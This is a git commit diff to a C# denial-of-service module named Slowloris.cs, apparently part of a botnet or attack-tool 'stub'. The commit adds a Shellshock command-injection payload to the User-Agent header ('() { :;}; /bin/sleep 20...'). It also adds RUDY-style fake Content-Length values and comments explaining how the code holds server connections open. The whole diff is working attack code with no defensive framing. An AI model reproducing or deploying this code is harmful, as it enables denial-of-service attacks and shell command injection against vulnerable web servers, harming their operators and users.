f58012508dbbb299ebe31de9fe8a7cb5922ce1c5
Rottweiler <rottweiler.hackhound@gmail.com>
2016-06-03 19:10:29 +0200

    DoS Shellshock in Slowloris

--- Stub/DoS/Slowloris.cs
+++ Stub/DoS/Slowloris.cs
@@ -6,6 +6,10 @@ using System.Text;
 
 namespace Stub.DoS
 {
+    /// <summary>
+    /// Slowloris, with additional "RUDY" attack (fake arbitrary Content-Length values)
+    /// And now, with basic DoS Shellshock attack in User-Agent string
+    /// </summary>
     class Slowloris : Base
     {
         public List<Socket> Sockets = new List<Socket>();
@@ -16,11 +20,14 @@ namespace Stub.DoS
                 StringBuilder sb = new StringBuilder();
                 sb.AppendLine("POST / HTTP/1.1");
                 sb.AppendLine("Host: " + addr.ToString());
-                sb.AppendLine("User-Agent: ");
+                //Shellshock DoS
+                sb.AppendLine("User-Agent: () { :;}; /bin/sleep 20|/sbin/sleep 20|/usr/bin/sleep 20");
                 sb.AppendLine("Keep-Alive: 900");
+                //RUDY
                 sb.AppendLine("Content-Length: 23858236396");
                 sb.AppendLine("Accept: *.*");
                 sb.AppendLine("X-a: 23858236396");
+                //Slowloris (indirectly by not attaching another \r\n)
 
                 byte[] payload = Encoding.UTF8.GetBytes(sb.ToString());
 
